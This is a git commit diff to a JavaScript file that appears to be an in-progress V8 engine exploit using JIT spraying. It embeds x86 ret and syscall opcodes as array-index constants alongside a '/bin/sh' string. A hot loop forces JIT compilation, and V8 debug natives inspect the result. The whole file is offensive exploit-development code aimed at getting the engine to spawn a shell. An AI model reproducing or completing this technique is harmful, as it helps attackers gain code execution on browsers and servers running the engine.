6cb90b3dc61551ca974be0eac0c2f60fb5fbf526
JerryMouseZ <1711333@mail.nankai.edu.cn>
2020-12-31 20:08:45 +0800

    use offset and no constant

--- no_constant/offset.js
+++ no_constant/offset.js
@@ -1,21 +1,17 @@
 var array = new Uint8Array();
-var obja = new Object();
-
 // %DebugPrint(array);
 const shell = "/bin/sh\0";
 function jsc(x, var1, var2, var3, var4) {
-    if (x == 0){
-        // %DebugPrint(jsc);
+    if (x == 0)
         %SystemBreak();
-    }
     var b = var2 % 0xc2;
     var d = var2 - 0xc2;
     var e = var2 ^ 0xc2;
-    array[0x58] = 0xc3;
-    array[0x5f] = 0xc3;
-    array[0x5a] = 0xc3;
-    array[0x5e] = 0xc3;
-    array[0xf] = 0x5;
+    array[0xc358] = var1;
+    array[0xc35f] = var1;
+    array[0xc35a] = var1;
+    array[0xc35e] = var1;
+    array[0x050f] = var1;
     var extra = e + 0xc305;
     // array[e + 0x5] = 0xc3;
     array[0x5] = 0xc3;
@@ -23,14 +19,14 @@ function jsc(x, var1, var2, var3, var4) {
     return result + shell;
 }
 
-obja.f = jsc;
 for (var i = 0; i < 0x1000; ++i) {
     array[i] = 0x1;
 }
 
 //var tmp = 0;
 for (var i = 0; i < 0x10000; i++) {
-    obja.f(1, 0xc35, 0xc22, 0xc32, 0xc55);
+    jsc(1, 0xc3, 0xc22, 0xc32, 0xc55);
 }
-%DebugPrint(obja);
-obja.f(0, 0xc35, 0xc22, 0xc32, 0xc55);
+
+
+jsc(0, 0x35, 0xc22, 0xc32, 0xc55);
